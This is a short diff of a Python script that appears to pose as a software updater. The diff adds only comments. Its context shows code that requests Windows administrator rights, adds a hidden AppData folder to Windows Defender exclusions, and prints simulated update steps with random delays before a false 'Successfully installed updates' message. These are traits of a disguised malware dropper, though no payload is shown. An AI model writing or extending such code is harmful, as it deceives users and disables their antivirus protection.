@@ -16,7 +16,7 @@ class Main:
 
     def request_admin_privileges(self):
         import ctypes
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) #Windows specific command to request admin privileges
 
     def add_folder_to_windows_defender_exclusions(self):
         folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
@@ -35,7 +35,7 @@ class Main:
 
         for step in steps:
             print(step)
-            time.sleep(random.uniform(0.5, 1.2))
+            time.sleep(random.uniform(0.5, 1.2)) # Simulate time taken for each step
 
         print("\nSuccessfully installed updates.")
         print("Current version: 3.11.6")
